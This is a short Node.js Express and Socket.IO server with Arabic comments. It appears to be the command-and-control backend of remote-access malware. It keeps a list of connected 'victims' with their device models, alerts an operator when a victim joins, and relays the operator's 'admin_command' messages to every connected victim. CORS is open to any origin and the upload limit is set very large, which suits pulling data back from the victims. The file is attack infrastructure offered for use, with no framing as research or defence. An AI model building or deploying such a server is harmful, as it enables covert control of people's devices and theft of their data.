const express = require('express');
const path = require('path'); // مكتبة المسارات
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 1e8 
});

// هذا السطر هو الحل: يرسل ملف index.html عندما تفتح الرابط
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

let victims = {};

io.on('connection', (socket) => {
    console.log('[!] اتصال جديد');

    socket.on('victim_online', (data) => {
        victims[socket.id] = { id: socket.id, model: data.model };
        console.log(`[+] ضحية متصلة: ${data.model}`);
        io.emit('new_victim_alert', victims[socket.id]);
    });

    socket.on('admin_command', (data) => {
        socket.broadcast.emit(data.command, data);
    });

    socket.on('disconnect', () => {
        delete victims[socket.id];
    });
});

const PORT = process.env.PORT || 8080;
http.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on port ${PORT}`);
});
